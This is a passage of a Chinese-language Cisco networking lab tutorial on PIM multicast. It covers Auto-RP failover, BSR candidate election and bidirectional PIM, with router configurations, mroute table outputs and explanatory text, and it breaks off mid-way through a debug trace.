R2配置： R2#conf t R2(config)#ip multicast-routing R2(config)#int e0/0 R2(config-if)#ip add 192.168.12.2 255.255.255.0 R2(config-if)#ip pim sparse-dense-mode R2(config-if)#no sh R2(config-if)#exit R2(config)#int e0/1 R2(config-if)#ip add 192.168.24.2 255.255.255.0 R2(config-if)#ip pim sparse-dense-mode R2(config-if)#no sh R2(config-if)#exit R2(config)#int lo0 R2(config-if)#ip add 2.2.2.2 255.255.255.0 R2(config-if)#ip pim sparse-dense-mode R2(config-if)#exit R2(config)#ip pim send-rp-announce loopback 0scope 20 R2(config)#ip pim send-rp-discovery loopback 0scope 20 R2(config)#router ospf 1 R2(config-router)#net 0.0.0.0 0.0.0.0 area 0 R2(config-router)#exit R3配置： R3#conf t R3(config)#ip multicast-routing R3(config)#int e0/0 R3(config-if)#ip add 192.168.13.3 255.255.255.0 R3(config-if)#ip pim sparse-dense-mode R3(config-if)#no sh R3(config-if)#exit R3(config)#int e0/1 R3(config-if)#ip add 192.168.34.3 255.255.255.0 R3(config-if)#ip pim sparse-dense-mode R3(config-if)#no sh R3(config-if)#exit R3(config-if)#ip add 3.3.3.3 255.255.255.0 R3(config-if)#ip pim sparse-dense-mode R3(config-if)#exit R3(config)#ip pim send-rp-announce loopback 0scope 20 R3(config)#ip pim send-rp-discovery loopback 0scope 20 R3(config)#router ospf 1 R3(config-router)#net 0.0.0.0 0.0.0.0 area 0 R3(config-router)#exit R4配置： R4#conf t R4(config)#ip multicast-routing R4(config)#int e0/0 R4(config-if)#ip add 192.168.24.4 255.255.255.0 R4(config-if)#ip pim sparse-dense-mode R4(config-if)#no sh R4(config-if)#exit R4(config)#int e0/1 R4(config-if)#ip add 192.168.34.4 255.255.255.0 R4(config-if)#ip pim sparse-dense-mode R4(config-if)#no sh R4(config-if)#exit R4(config)#int e0/2 R4(config-if)#ip add 192.168.0.1 255.255.255.0 R4(config-if)#ip pim sparse-dense-mode R4(config-if)#no sh R4(config-if)#exit R4(config)#router ospf 1 R4(config-router)#net 0.0.0.0 0.0.0.0 area 0 R4(config-router)#exit PC配置： PC#conf t PC(config)#no ip routing PC(config)#ip default-gateway 192.168.0.1 PC(config)#int e0/0 PC(config-if)#ip add 192.168.0.2 255.255.255.0 PC(config-if)#ip igmp join- PC(config-if)#ip igmp join-group 224.1.1.1 PC(config-if)#no sh 配置完成检查全网互通，查看R2、R3、R4 R2#sh ip mr //RP与MA同体 IP Multicast Routing Table Flags: D - Dense, S - Sparse, B - Bidir Group, s- SSM Group, C - Connected, L -Local, P - Pruned, R - RP-bit set, F - Register flag, T -SPT-bit set, J - Join SPT, M - MSDP created entry, X -Proxy Join Timer Running, A - Candidate for MSDP Advertisement, U -URD, I - Received Source Specific Host Report, Z -Multicast Tunnel, z - MDT-data group sender, Y -Joined MDT-data group, y - Sending to MDT-data group Outgoing interface flags: H - Hardware switched,A - Assert winner Timers:Uptime/Expires Interfacestate: Interface, Next-Hop or VCD, State/Mode (*, 224.0.1.39), 00:24:12/stopped, RP 0.0.0.0,flags: DCL Incominginterface: Null, RPF nbr 0.0.0.0 Outgoinginterface list: Loopback0, Forward/Sparse-Dense, 00:23:37/00:00:00 Ethernet0/1, Forward/Sparse-Dense, 00:23:37/00:00:00 Ethernet0/0, Forward/Sparse-Dense, 00:24:12/00:00:00 (2.2.2.2, 224.0.1.39), 00:24:12/00:01:59, flags:LT Incominginterface: Loopback0, RPF nbr 0.0.0.0 Outgoinginterface list: Ethernet0/1, Forward/Sparse-Dense, 00:23:38/00:00:00 Ethernet0/0, Forward/Sparse-Dense,00:24:14/00:00:00 (3.3.3.3, 224.0.1.39), 00:10:15/00:02:30, flags:LT Incominginterface: Ethernet0/1, RPF nbr 192.168.24.4 Outgoinginterface list: Ethernet0/0, Forward/Sparse-Dense, 00:10:15/00:00:00 Loopback0, Forward/Sparse-Dense, 00:10:15/00:00:00 (*, 224.0.1.40), 00:26:14/stopped, RP 0.0.0.0,flags: DCL Incominginterface: Null, RPF nbr 0.0.0.0 Outgoinginterface list: Ethernet0/1, Forward/Sparse-Dense, 00:11:50/00:00:00 Loopback0, Forward/Sparse-Dense, 00:23:40/00:00:00 Ethernet0/0, Forward/Sparse-Dense, 00:26:14/00:00:00 (2.2.2.2, 224.0.1.40), 00:23:14/00:02:11, flags:LT Incominginterface: Loopback0, RPF nbr 0.0.0.0 Outgoinginterface list: Ethernet0/1, Forward/Sparse-Dense, 00:11:50/00:00:00 Ethernet0/0, Forward/Sparse-Dense, 00:23:14/00:00:00 (3.3.3.3, 224.0.1.40), 00:10:17/00:02:09, flags:LT Incominginterface: Ethernet0/1, RPF nbr 192.168.24.4 Outgoinginterface list: Ethernet0/0, Forward/Sparse-Dense, 00:10:17/00:00:00 Loopback0, Forward/Sparse-Dense, 00:10:17/00:00:00 R3#sh ip mroute //RP与MA同体，同时是组播组224.1.1.1的RP，收到的注册信息 IP Multicast Routing Table Flags: D - Dense, S - Sparse, B - Bidir Group, s- SSM Group, C - Connected, L -Local, P - Pruned, R - RP-bit set, F - Register flag, T -SPT-bit set, J - Join SPT, M - MSDP created entry, X -Proxy Join Timer Running, A - Candidate for MSDP Advertisement, U -URD, I - Received Source Specific Host Report, Z -Multicast Tunnel, z - MDT-data group sender, Y -Joined MDT-data group, y - Sending to MDT-data group Outgoing interface flags: H - Hardware switched,A - Assert winner Timers:Uptime/Expires Interfacestate: Interface, Next-Hop or VCD, State/Mode (*, 224.1.1.1), 00:10:07/00:03:13, RP3.3.3.3, flags: S Incoming interface: Null, RPF nbr 0.0.0.0 Outgoing interface list: Ethernet0/1, Forward/Sparse-Dense, 00:10:07/00:03:13 (*, 224.0.1.39), 00:18:46/stopped, RP 0.0.0.0,flags: DCL Incominginterface: Null, RPF nbr 0.0.0.0 Outgoinginterface list: Loopback0, Forward/Sparse-Dense, 00:18:13/00:00:00 Ethernet0/1, Forward/Sparse-Dense, 00:18:15/00:00:00 Ethernet0/0, Forward/Sparse-Dense, 00:18:47/00:00:00 (2.2.2.2, 224.0.1.39), 00:12:45/00:02:33, flags:LT Incominginterface: Ethernet0/1, RPF nbr 192.168.34.4 Outgoinginterface list: Ethernet0/0, Prune/Sparse-Dense, 00:02:35/00:00:24 Loopback0, Forward/Sparse-Dense, 00:12:45/00:00:00 (3.3.3.3, 224.0.1.39), 00:18:26/00:02:51, flags:LT Incominginterface: Loopback0, RPF nbr 0.0.0.0 Outgoinginterface list: Ethernet0/1, Forward/Sparse-Dense, 00:18:16/00:00:00 Ethernet0/0, Forward/Sparse-Dense, 00:18:26/00:00:00, A (*, 224.0.1.40), 00:19:40/stopped, RP 0.0.0.0,flags: DCL Incominginterface: Null, RPF nbr 0.0.0.0 Outgoinginterface list: Ethernet0/1, Forward/Sparse-Dense, 00:13:57/00:00:00 Loopback0, Forward/Sparse-Dense, 00:18:16/00:00:00 Ethernet0/0, Forward/Sparse-Dense, 00:19:40/00:00:00 (2.2.2.2, 224.0.1.40), 00:14:52/00:02:42, flags:LT Incominginterface: Ethernet0/1, RPF nbr 192.168.34.4 Outgoinginterface list: Ethernet0/0, Prune/Sparse-Dense, 00:00:25/00:02:34 Loopback0, Forward/Sparse-Dense, 00:14:52/00:00:00 (3.3.3.3, 224.0.1.40), 00:17:25/00:02:26, flags:LT Incominginterface: Loopback0, RPF nbr 0.0.0.0 Outgoinginterface list: Ethernet0/1, Forward/Sparse-Dense, 00:13:57/00:00:00 Ethernet0/0,Prune/Sparse-Dense, 00:00:33/00:02:26, A R4#sh ip pim rp //R3为RP Group: 224.1.1.1, RP: 3.3.3.3, v2, v1, uptime00:15:13, expires 00:02:42 R4#sh ip mroute //查看R4组播路由表 IP Multicast Routing Table Flags: D - Dense, S - Sparse, B - Bidir Group, s- SSM Group, C - Connected, L -Local, P - Pruned, R - RP-bit set, F - Register flag, T -SPT-bit set, J - Join SPT, M - MSDP created entry, X -Proxy Join Timer Running, A - Candidate for MSDP Advertisement, U -URD, I - Received Source Specific Host Report, Z -Multicast Tunnel, z - MDT-data group sender, Y -Joined MDT-data group, y - Sending to MDT-data group Outgoing interface flags: H - Hardware switched,A - Assert winner Timers:Uptime/Expires Interfacestate: Interface, Next-Hop or VCD, State/Mode (*, 224.1.1.1), 00:28:35/stopped, RP3.3.3.3, flags: SJC //RPT树，RP为R3 Incoming interface: Ethernet0/1, RPF nbr 192.168.34.3 Outgoing interface list: Ethernet0/2, Forward/Sparse-Dense, 00:28:35/00:02:26 (192.168.1.2, 224.1.1.1),00:04:16/00:02:08, flags: T //SPT树 Incoming interface: Ethernet0/0, RPF nbr 192.168.24.2 Outgoing interface list: Ethernet0/2,Forward/Sparse-Dense, 00:04:16/00:02:26 (*, 224.0.1.39), 00:32:51/stopped, RP 0.0.0.0,flags: DC Incominginterface: Null, RPF nbr 0.0.0.0 Outgoinginterface list: Ethernet0/1, Forward/Sparse-Dense, 00:03:58/00:00:00 Ethernet0/0, Forward/Sparse-Dense, 00:32:51/00:00:00 (2.2.2.2, 224.0.1.39), 00:03:51/00:02:17, flags:T Incominginterface: Ethernet0/0, RPF nbr 192.168.24.2 Outgoinginterface list: Ethernet0/1, Forward/Sparse-Dense, 00:03:58/00:00:00 (3.3.3.3, 224.0.1.39), 00:03:30/00:02:40, flags:T Incominginterface: Ethernet0/1, RPF nbr 192.168.34.3 Outgoinginterface list: Ethernet0/0, Forward/Sparse-Dense, 00:03:30/00:00:00 (*, 224.0.1.40), 00:33:00/stopped, RP 0.0.0.0,flags: DCL Incominginterface: Null, RPF nbr 0.0.0.0 Outgoinginterface list: Ethernet0/1, Forward/Sparse-Dense, 00:04:05/00:00:00 Ethernet0/0, Forward/Sparse-Dense, 00:33:00/00:00:00 (2.2.2.2, 224.0.1.40), 00:32:27/00:02:30, flags:LT Incominginterface: Ethernet0/0, RPF nbr 192.168.24.2 Outgoinginterface list: Ethernet0/1, Forward/Sparse-Dense, 00:04:05/00:00:00 (3.3.3.3, 224.0.1.40), 00:04:04/00:02:53, flags:LT Incominginterface: Ethernet0/1, RPF nbr 192.168.34.3 Outgoinginterface list: Ethernet0/0, Forward/Sparse-Dense, 00:04:04/00:00:00 然后把R3的物理接口都关闭，等收敛完成后查看RP有没有自动切换到R2 R3#conf t //关闭端口 R3(config)#int e0/0 R3(config-if)#shu R3(config-if)#shutdown R3(config-if)#exit R3(config)#int e0/1 R3(config-if)#shutdown R3(config-if)#exit R4#sh ip pim rp //注册到R2 Group: 224.1.1.1, RP: 2.2.2.2, v2, v1, uptime00:00:13, expires 00:02:46 R2#sh ip mr //成为RP IP Multicast Routing Table Flags: D - Dense, S - Sparse, B - Bidir Group, s- SSM Group, C - Connected, L -Local, P - Pruned, R - RP-bit set, F - Register flag, T -SPT-bit set, J - Join SPT, M - MSDP created entry, X -Proxy Join Timer Running, A - Candidate for MSDP Advertisement, U -URD, I - Received Source Specific Host Report, Z -Multicast Tunnel, z - MDT-data group sender, Y -Joined MDT-data group, y - Sending to MDT-data group Outgoing interface flags: H - Hardware switched,A - Assert winner Timers: Uptime/Expires Interfacestate: Interface, Next-Hop or VCD, State/Mode (*, 224.1.1.1), 00:05:36/00:03:28, RP2.2.2.2, flags: S //RPT树，RP为R2 Incoming interface: Null, RPF nbr 0.0.0.0 Outgoing interface list: Ethernet0/1, Forward/Sparse-Dense, 00:00:01/00:03:28 (192.168.1.2, 224.1.1.1), 00:05:36/00:01:14,flags: T Incominginterface: Ethernet0/0, RPF nbr 192.168.12.1 Outgoinginterface list: Ethernet0/1, Forward/Sparse-Dense, 00:05:36/00:03:28 (*, 224.0.1.39), 00:37:52/stopped, RP 0.0.0.0,flags: DCL Incominginterface: Null, RPF nbr 0.0.0.0 Outgoinginterface list: Loopback0, Forward/Sparse-Dense, 00:37:16/00:00:00 Ethernet0/1, Forward/Sparse-Dense, 00:37:16/00:00:00 Ethernet0/0, Forward/Sparse-Dense, 00:37:52/00:00:00 (2.2.2.2, 224.0.1.39), 00:37:52/00:02:32, flags:LT Incominginterface: Loopback0, RPF nbr 0.0.0.0 Outgoinginterface list: Ethernet0/1, Forward/Sparse-Dense, 00:37:54/00:00:00 Ethernet0/0, Forward/Sparse-Dense, 00:38:29/00:00:00 (*, 224.0.1.40), 00:40:28/stopped, RP 0.0.0.0,flags: DCL Incominginterface: Null, RPF nbr 0.0.0.0 Outgoinginterface list: Ethernet0/1, Forward/Sparse-Dense, 00:26:04/00:00:00 Loopback0, Forward/Sparse-Dense, 00:37:54/00:00:00 Ethernet0/0, Forward/Sparse-Dense, 00:40:28/00:00:00 (2.2.2.2, 224.0.1.40), 00:37:28/00:02:19, flags:LT Incominginterface: Loopback0, RPF nbr 0.0.0.0 Outgoinginterface list: Ethernet0/1, Forward/Sparse-Dense, 00:26:04/00:00:00 Ethernet0/0, Forward/Sparse-Dense, 00:37:28/00:00:00 实验五、Bootstrap Router （BSR业界标准协议） 在采用自举路由器（BootStrap Router）方式配置汇集点(Rendezvous Point)的方法中，一组路由器被配置为候选自举路由器(C-BSRs)，一组路由器被配置为候选汇集点（C-RPs），通常建议这两组路由器是同样的路由器。候选汇集点会定期把候选汇集点通告消息（C-RP-Advs）以单播的形式发送到自举路由器；汇集点通告消息是一种PIM消息，它包括通告候选汇集点的地址、可选的组播组地址和一个掩码长度域（组的前缀）； 自举路由器收集这些通告消息并产生相应的自举消息，自举消息也是一种PIM消息，它包括候选RP和相应的组前缀（ip为224.0.0.13即所有使能pim的路由器，每60s泛洪一次。让其他路由器知道 BSR的位置。 同时也是通过这样的方式把RP信息发送出去），自举消息主要用于自举路由器的选择和分发RP点信息。自举消息支持一个简单的机制以便于侯选自举路由器之间选择出活跃的自举路由器，一般是优先级最高的自举路由器被选择为活跃的自举路由器。BSR不决定RP，只是收集RP候选信息并通告这些信息。多个BSR存在选举原则 优先级默认为0，值越小越优先，越有可能成为Active BSR 优先级相同（默认0），ip地址值越大越优，越可能成为active BSR 为获得RP信息，所有普通路由器都要收集自举（Bootstrap）消息，即普通路由器接收并保存由自举路由器发送来的自举消息，它采用在自举消息中发布的一组可用汇集点来获得合适的组播组到汇集点的映射。所有路由器采用散列函数来计算组播组和汇集点的映射关系，散列函数的算法是把组播组地址和候选汇集点的地址作为输入值，从而得到一个组播组的实际RP地址。 其他路由器收到信息后会选择自己的RP,依据原则选择RP为： &lt;/span&gt;&lt;/span&gt; 最长匹配组（acl覆盖的范围小的优先） RP优先级数值低的 bsr的哈希值，可以做到冗余处理 ip地址大的 Server配置： &lt;/span&gt; Server#conft Server(config)#noip routing Server(config)#ipdefault-gateway 192.168.1.1 Server(config)#inte0/0 Server(config-if)#ipadd 192.168.1.2 255.255.255.0 Server(config-if)#nosh Server(config-if)#exit R1配置： &lt;/span&gt; R1#conf t R1(config)#ip multicast-routing R1(config)#int e0/0 R1(config-if)#ip add 192.168.1.1255.255.255.0 R1(config-if)#ip pim sparse-mode R1(config-if)#no sh R1(config-if)#exit R1(config)#int e0/1 R1(config-if)#ip add 192.168.12.1255.255.255.0 R1(config-if)#ip pim sparse-mode R1(config-if)#no sh R1(config-if)#exit R1(config)#int e0/2 R1(config-if)#ip add 192.168.13.1255.255.255.0 R1(config-if)#ip pim sparse-mode R1(config-if)#no sh R1(config-if)#exit R1(config)#router ospf 1 R1(config-router)#net 0.0.0.0 0.0.0.0area 0 R1(config-router)#exit R2配置： &lt;/span&gt; R2#conf t R2(config)#ip multicast-routing R2(config)#int e0/0 R2(config-if)#ip add 192.168.12.2255.255.255.0 R2(config-if)#ip pim sparse-mode R2(config-if)#no sh R2(config-if)#exit R2(config)#int e0/1 R2(config-if)#ip add 192.168.25.2255.255.255.0 R2(config-if)#ip pim sparse-mode R2(config-if)#no sh R2(config-if)#exit R2(config)#int lo0 R2(config-if)#ip add 2.2.2.2255.255.255.255 R2(config-if)#ip pim sparse-mode R2(config-if)#exit R2(config)#ip pim bsr-candidate loopback0 R2(config)#ip pim rp-candidate loopback0 R2(config)#router ospf 1 R2(config-router)#net 0.0.0.0 0.0.0.0area 0 R2(config-router)#exit R3配置： &lt;/span&gt; R3#conf t R3(config)#ip multi R3(config)#ip multicast-routing R3(config)#int e0/0 R3(config-if)#ip add 192.168.13.3255.255.255.0 R3(config-if)#ip pim sparse-mode R3(config-if)#no sh R3(config-if)#exit R3(config)#int e0/1 R3(config-if)#ip add 192.168.34.3255.255.255.0 R3(config-if)#ip pim sparse-mode R3(config-if)#no sh R3(config-if)#exit R3(config)#router ospf 1 R3(config-router)#net 0.0.0.0 0.0.0.0area 0 R3(config-router)#exit R4配置; R4#conf t R4(config)#ip multicast-routing R4(config)#int e0/0 R4(config-if)#ip add 192.168.34.4255.255.255.0 R4(config-if)#ip pim sparse-mode R4(config-if)#no sh R4(config-if)#exit R4(config)#int e0/1 R4(config-if)#ip add 192.168.45.4255.255.255.0 R4(config-if)#ip pim sparse-mode R4(config-if)#no sh R4(config-if)#exit R4(config)#int lo0 R4(config-if)#ip add 4.4.4.4255.255.255.255 R4(config-if)#ip pim sparse-mode R4(config-if)#exit R4(config)#ip pim bsr-candidate loopback0 R4(config)#ip pim rp-candidate loopback0 R4(config)#router ospf 1 R4(config-router)#net 0.0.0.0 0.0.0.0area 0 R4(config-router)#exit R5配置： &lt;/span&gt; R5#conf t R5(config)#ip multicast-routing R5(config)#int e0/0 R5(config-if)#ip add 192.168.25.5255.255.255.0 R5(config-if)#ip pim sparse-mode R5(config-if)#no sh R5(config-if)#exit R5(config)#int e0/1 R5(config-if)#ip add 192.168.45.5255.255.255.0 R5(config-if)#ip pim sparse-mode R5(config-if)#no sh R5(config-if)#exit R5(config-if)#exit R5(config)#int e0/2 R5(config-if)#ip add 192.168.0.1255.255.255.0 R5(config-if)#ip pim sparse-mode R5(config-if)#no sh R5(config-if)#exit R5(config)#router ospf 1 R5(config-router)#net 0.0.0.0 0.0.0.0area 0 R5(config-router)#exit PC配置： &lt;/span&gt; PC#conf t PC(config)#no ip routing PC(config)#ip default-gateway192.168.0.1 PC(config)#int e0/0 PC(config-if)#ip add 192.168.0.2255.255.255.0 PC(config-if)#ip igmp join-group224.1.1.1 PC(config-if)#no sh PC(config-if)#exit 完成以上配置查看R5、R2、R4 R5#sh ip pim bsr-router //活动BSR为R4 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt; PIMv2 Bootstrap information BSR address: 4.4.4.4 (?) Uptime: 00:00:32, BSRPriority: 0, Hash mask length: 0 Expires: 00:01:37 R2#sh ip mroute //R2不是RP没有收到注册信息 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt; IP Multicast Routing Table Flags: D - Dense, S - Sparse, B - BidirGroup, s - SSM Group, C - Connected, L - Local, P - Pruned, R - RP-bit set, F - Register flag, T - SPT-bit set, J - Join SPT, M - MSDP created entry, X - Proxy Join Timer Running, A - Candidate for MSDP Advertisement, U - URD, I - Received Source Specific Host Report, Z - Multicast Tunnel, z - MDT-data group sender, Y - Joined MDT-data group, y - Sending to MDT-data group Outgoing interface flags: H - Hardwareswitched, A - Assert winner Timers: Uptime/Expires Interface state: Interface, Next-Hop or VCD,State/Mode (*, 224.0.1.40), 00:27:56/00:02:40, RP0.0.0.0, flags: DCL Incoming interface: Null, RPF nbr 0.0.0.0 Outgoing interface list: Ethernet0/0,Forward/Sparse, 00:27:56/00:02:40 R4#sh ip mroute //R4有注册信息，说明它被选为RP &lt;/span&gt;&lt;/span&gt;&lt;/span&gt; IP Multicast Routing Table Flags: D - Dense, S - Sparse, B - BidirGroup, s - SSM Group, C - Connected, L - Local, P - Pruned, R - RP-bit set, F - Register flag, T - SPT-bit set, J - Join SPT, M - MSDP created entry, X - Proxy Join Timer Running, A - Candidate for MSDP Advertisement, U - URD, I - Received Source Specific Host Report, Z - Multicast Tunnel, z - MDT-data group sender, Y - Joined MDT-data group, y - Sending to MDT-data group Outgoing interface flags: H - Hardware switched,A - Assert winner Timers: Uptime/Expires Interface state: Interface, Next-Hop or VCD,State/Mode (*, 224.1.1.1),00:12:29/00:02:49, RP 4.4.4.4, flags: S &lt;/span&gt;&lt;/span&gt; Incoming interface: Null, RPF nbr 0.0.0.0 &lt;/span&gt;&lt;/span&gt; Outgoing interface list: &lt;/span&gt;&lt;/span&gt; Ethernet0/1, Forward/Sparse, 00:12:29/00:02:49 (*, 224.0.1.40), 00:22:23/00:02:35, RP0.0.0.0, flags: DCL Incoming interface: Null, RPF nbr 0.0.0.0 Outgoing interface list: Ethernet0/0, Forward/Sparse, 00:22:23/00:02:35 从Server端ping 224.1.1.1，检查变化： &lt;/span&gt; Server#ping 224.1.1.1 repeat 100 Type escape sequence to abort. Sending 100, 100-byte ICMP Echos to224.1.1.1, timeout is 2 seconds: .. Reply to request 2 from 192.168.0.2, 112ms Reply to request 3 from 192.168.0.2, 96ms R4#sh ip mroute IP Multicast Routing Table Flags: D - Dense, S - Sparse, B - BidirGroup, s - SSM Group, C - Connected, L - Local, P - Pruned, R - RP-bit set, F - Register flag, T - SPT-bit set, J - Join SPT, M - MSDP created entry, X - Proxy Join Timer Running, A - Candidate for MSDP Advertisement, U - URD, I - Received Source Specific Host Report, Z - Multicast Tunnel, z - MDT-data group sender, Y - Joined MDT-data group, y - Sending to MDT-data group Outgoing interface flags: H - Hardwareswitched, A - Assert winner Timers: Uptime/Expires Interface state: Interface, Next-Hop or VCD,State/Mode (*, 224.1.1.1),00:14:59/stopped, RP 4.4.4.4, flags: S //RPT树 &lt;/span&gt;&lt;/span&gt; Incoming interface: Null, RPF nbr 0.0.0.0 &lt;/span&gt;&lt;/span&gt; Outgoing interface list: &lt;/span&gt;&lt;/span&gt; Ethernet0/1, Forward/Sparse,00:14:59/00:03:17 &lt;/span&gt;&lt;/span&gt; (192.168.1.2,224.1.1.1), 00:00:04/00:02:59, flags: PTX //切换到SPT树 &lt;/span&gt;&lt;/span&gt; Incoming interface: Ethernet0/1, RPF nbr192.168.45.5 &lt;/span&gt;&lt;/span&gt; Outgoing interface list: Null &lt;/span&gt;&lt;/span&gt; (*, 224.0.1.40), 00:24:53/00:02:03, RP0.0.0.0, flags: DCL Incoming interface: Null, RPF nbr 0.0.0.0 Outgoing interface list: Ethernet0/0, Forward/Sparse, 00:24:55/00:02:01 关闭R4的两个物理端口，查看RP是否会自动切换到2.2.2.2 R4#conf t //关闭R4端口 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt; R4(config)#int e0/0 R4(config-if)#shutdown R4(config-if)#int e0/1 R4(config-if)#shutdown R5#sh ip pim bsr //活动BSR变为R2 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt; R5#sh ip pim bsr-router PIMv2 Bootstrap information BSR address: 2.2.2.2 (?) Uptime: 00:03:17, BSRPriority: 0, Hash mask length: 0 Expires: 00:01:52 R5#sh ip mroute //RP切换到R2上 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt; IP Multicast Routing Table Flags: D - Dense, S - Sparse, B - BidirGroup, s - SSM Group, C - Connected, L - Local, P - Pruned, R - RP-bit set, F - Register flag, T - SPT-bit set, J - Join SPT, M - MSDP created entry, X - Proxy Join Timer Running, A - Candidate for MSDP Advertisement, U - URD, I - Received Source Specific Host Report, Z - Multicast Tunnel, z - MDT-data group sender, Y - Joined MDT-data group, y - Sending to MDT-data group Outgoing interface flags: H - Hardwareswitched, A - Assert winner Timers: Uptime/Expires Interface state: Interface, Next-Hop or VCD,State/Mode (*, 224.1.1.1),00:23:01/00:02:57, RP 2.2.2.2, flags: SJC &lt;/span&gt;&lt;/span&gt; Incoming interface: Ethernet0/0, RPF nbr192.168.25.2 &lt;/span&gt;&lt;/span&gt; Outgoing interface list: &lt;/span&gt;&lt;/span&gt; Ethernet0/2, Forward/Sparse,00:23:01/00:02:57 &lt;/span&gt;&lt;/span&gt; (*, 224.0.1.40), 00:27:21/00:02:30, RP0.0.0.0, flags: DCL Incoming interface: Null, RPF nbr 0.0.0.0 Outgoing interface list: Ethernet0/0, Forward/Sparse, 00:27:21/00:02:30 实验六、组播双向树 &lt;/span&gt;&lt;/span&gt; &lt;/span&gt; 5. &lt;div style=&quot;background: white&quot;&gt;&lt;span style=&quot;color:black; font-family:宋体; font-size:10pt&quot;&gt;PIM Sparse-Mode (PIM-SM)是单向树的转发，初始组播流量从源发送到RP，然后由RP使用共享树转发给接收者；如果RP不在最短路径树上，会发生自动的从源到接受者的最短路径树的计算，进而生成源树路由条目（S,G）；这样的行为可能导致路由器维护比较多的源树路由条目（S,G），造成一定的系统和网络资源的占用。Bidirectional PIM (Bidir-PIM)即双向PIM属于PIM-SM的一个分支和扩展技术，能够优化PIM-SM单向树所导致的资源占用问题。 在Bidir-PIM运行模式下，无需建立任何源树条目（S，G），所有的组播流量都使用共享树转发（*，G），在该模式下，没有任何源注册消息，组播源和接收者都加入到同一棵共享树。 Bidir-PI基本術語 &lt;/span&gt;&lt;/span&gt; MulticastRouting Information Base (MRIB)pim协议根据单播路由表计算的到RP的组播共享树路径。 RendezvousPoint Address (RPA) RendezvousPoint Link (RPL)，即RP的直连链路 DesignatedForwarder (DF) 替代了DR，同时也是一种防环机制 除了RPL外（RPL不选举DF）,在组播域中的每条链路都会自动选举一个唯一的DF路由器，选举原则为对比同一条链路的每个接口到RP的单播路径， 具有最佳路径的接口的路由器被选为DF。DF负责转发该链路 的组播流量，也负责处理来自下游路由器的共享树加入消息 RPFInterface :每个路由器去往RP的最佳路径的接口，是与DF直连的接口。 Bidir-PIM组播路由的状态对于每个特定的组和RP，在每个路由器建立以下的组播转发路径： &lt;/span&gt; 从组播源到RP的转发路径，沿着RPF接口转发到RP。 从RP到组播接收者的转发路径，或者从组播源直接转发到接收者的路径 按照以上方法建立转发路径，组播路由表项： &lt;/span&gt; 仅仅有（*，G），falg为B 没有入接口，只有Bidir-Upstream，去往RP 出站接口列表：forward代表把流量转发给接收者；Bidir-Upstream代表拷贝自上行流量接口。 Bidir-PIM的对组播包的转发 &lt;/span&gt;&lt;/span&gt; 仅仅当一个数据包是来自RPF接口（从源到RP方向），或者来自DF路由器的接口（从RP到接收者方向）；路由器才会接收该数据包。 路由器开始构建数据包的转发出口，从所有的出站接口列表中删除入站接口，如果出站接口列表不为空，将数据包转发给其它所有的出站接口。 如果源与RP在同一侧，直接发送给接受者 Server1配置： &lt;/span&gt; Server#conf t Server(config)#no ip routiiing Server(config)#ip default-gateway 192.168.1.1 Server(config)#int e0/0 Server(config-if)#ip add 192.168.1.2 255.255.255.0 Server(config-if)#no sh Server(config-if)#exit R1配置： &lt;/span&gt; R1#conf t R1(config)#ip multicast-routing R1(config)#ip pim bidir-enable R1(config)#ip pim rp-address 3.3.3.3 bidir R1(config)#int e0/0 R1(config-if)#ip add 192.168.1.1255.255.255.0 R1(config-if)#ip pim sparse-mode R1(config-if)#no sh R1(config-if)#exitp R1(config)#int e0/1 R1(config-if)#ip add 192.168.12.1255.255.255.0 R1(config-if)#ip pim sparse-mode R1(config-if)#no sh R1(config-if)#exit R1(config)#int e0/2 R1(config-if)#ip add 192.168.13.1255.255.255.0 R1(config-if)#ip pim sparse-mode R1(config-if)#no sh R1(config-if)#exit R1(config)#router ospf 1 R1(config-router)#net 0.0.0.0 0.0.0.0 area 0 R1(config-router)#exit R2配置： &lt;/span&gt; R2#conf t R2(config)#ip multicast-routing R2(config)#ip pim bidir-enable R2(config)#ip pim rp-address 3.3.3.3 bidir R2(config)#int e0/0 R2(config-if)#ip add 192.168.12.2255.255.255.0 R2(config-if)#ip pim sparse-mode R2(config-if)#no sh R2(config-if)#exit R2(config)#int e0/1 R2(config-if)#ip add 192.168.24.2 255.255.255.0 R2(config-if)#ip pim sparse-mode R2(config-if)#no sh R2(config-if)#exit R2(config)#router ospf 1 R2(config-router)#net 0.0.0.0 0.0.0.0 area 0 R2(config-router)#exit R3配置： &lt;/span&gt; R3#conf t R3(config)#ip multicast-routing R3(config)#ip pim bidir-enable R3(config)#ip pim rp-address 3.3.3.3 bidir R3(config)#int e0/0 R3(config-if)#ip add 192.168.13.3255.255.255.0 R3(config-if)#ip pim sparse-mode R3(config-if)#no sh R3(config-if)#exit R3(config)#int e0/1 R3(config-if)#ip add 192.168.34.3255.255.255.0 R3(config-if)#ip pim sparse-mode R3(config-if)#no sh R3(config-if)#exit R3(config)#int lo0 R3(config-if)#ip add 3.3.3.3 255.255.255.255 R3(config-if)#ip pim sparse-mode R3(config-if)#exit R3(config)#router ospf 1 R3(config-router)#net 0.0.0.0 0.0.0.0 area 0 R3(config-router)#exit R4配置： &lt;/span&gt; R4#conf t R4(config)#ip multicast-routing R4(config)#ip pim bidir-enable R4(config)#ip pim rp-address 3.3.3.3 bidir R4(config)#int e0/0 R4(config-if)#ip add 192.168.24.4255.255.255.0 R4(config-if)#ip pim sparse-mode R4(config-if)#no sh R4(config-if)#exit R4(config)#int e0/1 R4(config-if)#ip add 192.168.34.4255.255.255.0 R4(config-if)#ip pim sparse-mode R4(config-if)#no sh R4(config-if)#exit R4(config)#int e0/2 R4(config-if)#ip add 192.168.0.1255.255.255.0 R4(config-if)#ip pim sparse-mode R4(config-if)#no sh R4(config-if)#exit R4(config)#router ospf 1 R4(config-router)#net 0.0.0.0 0.0.0.0 area 0 R4(config-router)#exit PC配置： &lt;/span&gt; PC#conf t PC(config)#no ip routing PC(config)#ip default-gateway 192.168.0.1 PC(config)#int e0/0 PC(config-if)#ip add 192.168.0.2255.255.255.0 PC(config-if)#ip igmp join-group 224.1.1.1 PC(config-if)#no sh PC(config-if)#exit 配置完成后观察R3 R3# debug ip pim Mar 1 00:09:36.027: PIM(0): Join-list: (, 224.1.1.1), RPT-bit set, WC-bitset Mar 1 00:09:36.031: PIM(0): Check RP 3.3.3.3 into the (, 224.1.1.1) entry Mar 1 00:09:36.031: PIM(0): Add Ethernet0/1/192.168.34.4 to (, 